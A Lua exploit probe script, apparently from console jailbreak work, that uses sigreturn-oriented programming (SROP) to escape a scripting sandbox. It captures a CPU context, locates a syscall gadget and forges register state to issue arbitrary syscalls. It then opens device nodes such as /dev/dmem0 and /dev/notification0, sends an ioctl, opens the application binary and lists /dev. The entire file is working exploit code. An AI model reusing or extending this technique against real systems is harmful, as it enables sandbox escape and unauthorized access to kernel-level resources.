-- CRASH_CLASS: LOW
-- PROBE 131c: Minimal SROP open+read test

print("=== PROBE 131c ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)

-- Capture context once
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex(sc_addr))

-- Helper: reuse ctx, just set RAX + args + fire
local function srop(num, a1, a2, a3)
    -- Re-capture context each time for fresh state
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)  -- RIP
    memory.write_qword(ctx + MC + 0x38, uint64(num))  -- RAX
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end  -- RDI
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end  -- RSI
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end  -- RDX
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local P = gpu
local B = gpu + 0x100

-- Test: open /dev/random + read
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end

ws(P, "/dev/random")
local rv_o = srop(5, P, uint64(0))
print("open(/dev/random)=" .. hex(rv_o))
local fd = to_num(rv_o)

if fd > 0 and fd < 256 then
    memory.write_qword(B, uint64(0))
    memory.write_qword(B+8, uint64(0))
    local rv_r = srop(3, uint64(fd), B, uint64(16))
    print("read(16)=" .. hex(rv_r))
    local rr_h, rr_l = get_hi_lo(rv_r)
    if rr_l > 0 then
        print("*** READ WORKS! bytes=" .. hex(memory.read_qword(B)) .. " " .. hex(memory.read_qword(B+8)))
    end
    srop(6, uint64(fd))
end

-- Test: open /dev/notification0 + ioctl
ws(P, "/dev/notification0")
local rv_n = srop(5, P, uint64(2))
print("open(/dev/notification0)=" .. hex(rv_n))
local nfd = to_num(rv_n)

if nfd > 0 and nfd < 256 then
    memory.write_qword(B, uint64(0))
    memory.write_qword(B+8, uint64(0))
    -- Try one ioctl
    local rv_io = srop(54, uint64(nfd), uint64(0xC0104E00), B)
    print("ioctl(0xC0104E00)=" .. hex(rv_io))
    print("  buf=" .. hex(memory.read_qword(B)) .. " " .. hex(memory.read_qword(B+8)))
    srop(6, uint64(nfd))
end

-- Test: open /dev/dmem0
ws(P, "/dev/dmem0")
local rv_dm = srop(5, P, uint64(0))
print("open(/dev/dmem0)=" .. hex(rv_dm))
local dmfd = to_num(rv_dm)
if dmfd > 0 and dmfd < 256 then
    print("*** DMEM0 OPEN fd=" .. dmfd .. " ***")
    srop(6, uint64(dmfd))
end

-- Test: open /app0/eboot.bin
ws(P, "/app0/eboot.bin")
local rv_eb = srop(5, P, uint64(0))
print("open(/app0/eboot.bin)=" .. hex(rv_eb))

-- Test: list /dev
ws(P, "/dev")
local rv_dev = srop(5, P, uint64(0))
print("open(/dev)=" .. hex(rv_dev))
local devfd = to_num(rv_dev)
if devfd > 0 and devfd < 256 then
    memory.write_qword(B, uint64(0))
    local rv_de = srop(272, uint64(devfd), B, uint64(0x2000))
    print("getdirentries=" .. hex(rv_de))
    local rde_h, rde_l = get_hi_lo(rv_de)
    if rde_l > 0 and rde_l < 0x2000 then
        print(rde_l .. " bytes of /dev entries!")
        local pos = 0
        local cnt = 0
        while pos < rde_l and cnt < 30 do
            local d4 = to_num(memory.read_dword(B + pos + 4))
            if d4 == 0 then break end
            local reclen = d4 % 65536
            local namlen = math.floor(d4 / 16777216)
            if reclen == 0 then break end
            local name = ""
            for i = 0, math.min(namlen, 30) - 1 do
                local b = to_num(memory.read_byte(B + pos + 8 + i))
                if b >= 32 and b < 127 then name = name .. string.char(b) end
            end
            if #name > 0 then print("  /dev/" .. name) end
            pos = pos + reclen
            cnt = cnt + 1
        end
    end
    srop(6, uint64(devfd))
end

print("pid=" .. to_num(sc20()))
print("=== DONE ===")
